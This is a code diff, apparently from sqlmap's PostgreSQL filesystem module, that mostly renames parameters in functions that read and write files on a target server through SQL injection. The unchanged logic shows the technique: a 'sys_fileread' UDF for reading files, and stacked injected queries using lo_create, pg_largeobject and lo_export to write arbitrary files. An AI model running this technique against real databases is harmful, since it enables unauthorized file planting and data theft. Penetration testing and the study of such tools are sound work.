@@ -22,22 +22,22 @@ class Filesystem(GenericFilesystem):
 
         GenericFilesystem.__init__(self)
 
-    def stackedReadFile(self, rFile):
-        infoMsg = "fetching file: '%s'" % rFile
+    def stackedReadFile(self, remoteFile):
+        infoMsg = "fetching file: '%s'" % remoteFile
         logger.info(infoMsg)
 
         self.initEnv()
 
-        return self.udfEvalCmd(cmd=rFile, udfName="sys_fileread")
+        return self.udfEvalCmd(cmd=remoteFile, udfName="sys_fileread")
 
-    def unionWriteFile(self, wFile, dFile, fileType, forceCheck=False):
+    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
         errMsg = "PostgreSQL does not support file upload with UNION "
         errMsg += "query SQL injection technique"
         raise SqlmapUnsupportedFeatureException(errMsg)
 
-    def stackedWriteFile(self, wFile, dFile, fileType, forceCheck=False):
-        wFileSize = os.path.getsize(wFile)
-        content = open(wFile, "rb").read()
+    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
+        localFileSize = os.path.getsize(localFile)
+        content = open(localFile, "rb").read()
 
         self.oid = randomInt()
         self.page = 0
@@ -56,7 +56,7 @@ class Filesystem(GenericFilesystem):
         inject.goStacked("SELECT lo_create(%d)" % self.oid)
         inject.goStacked("DELETE FROM pg_largeobject WHERE loid=%d" % self.oid)
 
-        for offset in xrange(0, wFileSize, LOBLKSIZE):
+        for offset in xrange(0, localFileSize, LOBLKSIZE):
             fcEncodedList = self.fileContentEncode(content[offset:offset + LOBLKSIZE], "base64", False)
             sqlQueries = self.fileToSqlQueries(fcEncodedList)
 
@@ -69,12 +69,12 @@ class Filesystem(GenericFilesystem):
             self.page += 1
 
         debugMsg = "exporting the OID %s file content to " % fileType
-        debugMsg += "file '%s'" % dFile
+        debugMsg += "file '%s'" % remoteFile
         logger.debug(debugMsg)
 
-        inject.goStacked("SELECT lo_export(%d, '%s')" % (self.oid, dFile), silent=True)
+        inject.goStacked("SELECT lo_export(%d, '%s')" % (self.oid, remoteFile), silent=True)
 
-        written = self.askCheckWrittenFile(wFile, dFile, forceCheck)
+        written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
 
         inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
 
